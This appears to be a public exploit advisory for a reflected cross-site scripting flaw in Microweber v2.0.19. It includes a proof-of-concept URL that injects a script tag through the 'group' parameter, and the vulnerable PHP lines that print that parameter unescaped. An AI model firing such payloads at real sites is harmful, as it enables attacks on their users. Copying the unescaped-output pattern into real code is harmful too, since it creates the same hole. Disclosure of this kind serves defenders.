# Exploit Title: Microweber v2.0.19 - Cross-Site Scripting (XSS)
## Date: 1/3/2025
## Vendor Homepage: https://github.com/microweber/microweber
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Microweber
## Version: v2.0.19
## Exploit Description:
## Microweber v2.0.19 suffers from Reflected Cross-Site Scripting (XSS) Vulnerability in the 'group' parameter of the 'userfiles/modules/settings/group/website_group/index.php' script. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------
```
http://localhost/admin/settings?group=1%22%3E%3C/module%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E%3Cmodule%3E%22(InJECT HERE)
```

code snippet:
userfiles/modules/settings/group/website_group/index.php
```
...
    $group = $_GET['group']; // line 13
...
        $show_inner = $group; // line 39
...
        <module type="<?php print $show_inner ?>"/> // line 48   
... 
```


